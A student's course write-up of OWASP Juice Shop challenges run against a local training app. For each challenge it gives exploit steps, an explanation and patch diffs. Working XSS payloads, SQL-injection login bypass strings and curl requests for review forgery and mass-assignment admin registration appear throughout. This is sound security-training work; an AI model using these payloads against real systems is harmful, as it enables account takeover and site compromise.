# Start Here

`Name`: Kevin Peter Karatassos  
`NetID`: kevkp

For each problem below, you will,

1. List the steps necessary to execute the exploit.
2. An explanation of what the vulnerability was.
3. An explanation of how you would patch the vulnerability.
4. If the challenge had a patch portion, enter the code used to patch the challenge.

--

## Scoreboard

### Steps

1. Navigate directly to `http://localhost:3000/#/score-board` to view all available challenges and their completion status.

---

## DOM XSS

### Exploit steps

1. Enter ``<iframe src="javascript:alert(`xss`)">`` into the search bar.
2. The browser navigates to `http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E`, executing the payload.

### Explanation

The application reads the `q` parameter directly from the URL and renders it into the DOM without sanitization. The browser interprets the injected `<iframe>` tag as executable HTML, triggering the alert. 

### Patch

Sanitize all URL parameters before rendering them in the DOM. Use Angular's built-in `DomSanitizer` or encode HTML entities to prevent script execution.

### Patch code

```
6		-	this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
	6	+	this.searchValue = queryParam
```

---

## Reflected XSS

### Exploit steps

1. Navigate to `http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E`
2. The payload from the `id` parameter executes immediately.

*Note: The Comet browser I use blocks this via its XSS auditor; however, it worked in Safari.*


### Explanation

The `track-result` endpoint reflects the `id` query parameter directly into the page without escaping or validation, allowing the browser to execute embedded scripts.

### Patch

Escape all user-supplied data before inserting it into the HTML response. Implement Content Security Policy (CSP) headers to prevent inline script execution.

### Patch code

Not applicable

---

## Forged Review

### Exploit steps

1. Log in and extract your Bearer token from the Authorization header.
2. Identify the target review's ID.
3. Execute:
```bash
curl -X PATCH 'http://localhost:3000/rest/products/reviews' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <YOUR_TOKEN>' \
  --data-raw '{"message":"Modified text", "id":"<REVIEW_ID>"}'
```

### Explanation

The API fails to verify that the authenticated user owns the review being modified (Broken Object-Level Authorization). Any authenticated user can modify any review by providing its ID.

### Patch

Verify that the user making the request is the original review author before allowing modifications. Compare the user ID from the token with the review's author ID.

### Patch code

```
5		-	{ _id: req.body.id },
	5	+	{ _id: req.body.id, author: user.data.email },
```

---

## Login Admin

### Exploit steps

1. Navigate to the login page.
2. Enter `' OR TRUE --` in the Email field.
3. Enter any password.
4. Click login.

### Explanation

User input is directly concatenated into the SQL query without parameterization. The payload closes the email condition and injects `TRUE`, causing the query to return the first user (admin).

### Patch

Use prepared statements with parameterized queries to prevent SQL injection. Never concatenate user input directly into SQL strings.

### Patch code

```
	1	+	import {BasketModel} from "../../../models/basket";
	2	+	
⋮
15		-	models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })
	17	+	models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
	18	+	{ bind: [ req.body.email, security.hash(req.body.password) ], model: models.User, plain: true })
```


---

## Admin Section

### Exploit steps

1. Log in using the SQL injection payload: Email: `' OR 1=1--`, Password: anything.
2. Navigate to `http://localhost:3000/#/administration`.

### Explanation

By exploiting the login SQL injection, an attacker gains admin privileges, granting access to the administration panel and sensitive user management features.

### Patch

Fix the login mechanism by using parameterized queries (see Login Admin patch). This prevents unauthorized elevation of privileges.

### Patch code

```
2		-	 {
3		-	  path: 'administration',
4		-	  component: AdministrationComponent,
5		-	  canActivate: [AdminGuard]
6		-	 },
	2	+  	/* 	TODO: Externalize admin functions into separate application
	3	+	 * 	that is only accessible inside corporate network.
	5	+	 * 	 {
	6	+	 * 	   path: 'administration',
	7	+	 * 	   component: AdministrationComponent,
	8	+	 * 	   canActivate: [AdminGuard]
	9	+	 * 	 },
	10	+	 */
```

---

## Admin Registration

### Exploit steps

1. Execute:
```bash
curl -X POST 'http://localhost:3000/api/Users/' \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"hacker@test.com","password":"password123","passwordRepeat":"password123","securityQuestion":{"id":1},"securityAnswer":"test","role":"admin"}'
```

### Explanation

The API accepts all fields provided in the request body without filtering (Mass Assignment vulnerability). By including `"role":"admin"`, attackers grant themselves administrative privileges during registration.

### Patch

Explicitly whitelist allowed fields during user creation. Reject or ignore the `role` field from client requests; assign roles only through authenticated admin endpoints.

### Patch code

```
2		-	 finale.initialize({ app, sequelize })
	2	+	 import { HintModel } from '../../../models/hint'
	3	+
	4	+	finale.initialize({ app, sequelize })
⋮
	37	+		context.instance.role = 'customer'
```

---

## API-Only XSS

### Exploit steps

1. Log in as admin using SQL injection bypass.
2. Extract your Bearer token.
3. Execute:
```bash
curl -X PUT 'http://localhost:3000/api/Products/1' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <ADMIN_TOKEN>' \
  --data-raw '{"description": "<iframe src=\"javascript:alert(`xss`)\">"}'
```

### Explanation

The Products API endpoint does not sanitize the description field, allowing authenticated admins to inject persistent XSS payloads. Unlike the UI, the API bypasses client-side protections, making the vulnerability "API-only." 

### Patch

Sanitize all user-provided content before storing it in the database. Apply HTML encoding to product descriptions and use Angular's `DomSanitizer` when rendering stored content.

### Patch code (extra credit)

```
8		-	        this.trustProductDescription(products)
⋮
58		-	  }
59		-	
60		-	  trustProductDescription (tableData: any[]) {
61		-	    for (let i = 0; i < tableData.length; i++) {
62		-	      tableData[i].description = this.sanitizer.bypassSecurityTrustHtml(tableData[i].description)
63		-	    }
```
